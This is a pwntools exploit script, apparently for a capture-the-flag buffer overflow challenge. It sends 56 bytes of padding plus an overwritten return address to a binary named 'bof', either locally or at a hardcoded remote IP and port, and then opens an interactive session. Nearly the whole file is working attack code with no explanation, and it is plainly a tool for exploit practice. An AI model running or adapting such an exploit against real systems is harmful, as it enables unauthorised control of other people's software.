#!/usr/bin/python3

from pwn import *

exe = ELF('bof', checksec=False)
# libc = ELF('0', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('207.148.79.171', 2501)
else:
        p = process(exe.path)

GDB()
payload = b'a'*48 + b'a'*8 + p64(0x4011d7+1)
sla(b':', payload)
# sleep(5)
p.interactive()
